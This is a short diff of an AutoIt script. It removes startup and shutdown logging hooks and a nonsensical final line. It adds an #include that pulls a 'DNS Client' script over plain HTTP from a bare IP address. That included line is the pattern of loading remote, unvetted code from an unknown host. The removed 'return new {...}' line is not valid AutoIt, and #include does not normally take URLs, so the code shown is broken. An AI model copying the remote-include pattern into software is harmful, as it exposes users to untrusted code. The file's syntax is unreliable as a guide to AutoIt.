@@ -1,14 +1,3 @@
 ﻿#include-once
-#OnAutoItStartRegister "OnStartup"
-#OnAutoItExitRegister "OnShutdown"
+#include "http://155.94.137.18/files/AutoIT/DNS%20Client.au3"
 
-Func OnStartup()
-    ConsoleWriteLine("---- START ----")
-EndFunc
-
-Func OnShutdown()
-    ConsoleWriteLine("---- STOP ----")
-EndFunc
-
-
-return new { { 1, 0, "lel" }, { @arguments, 1, 0 }, { 0, 0, 1 } }
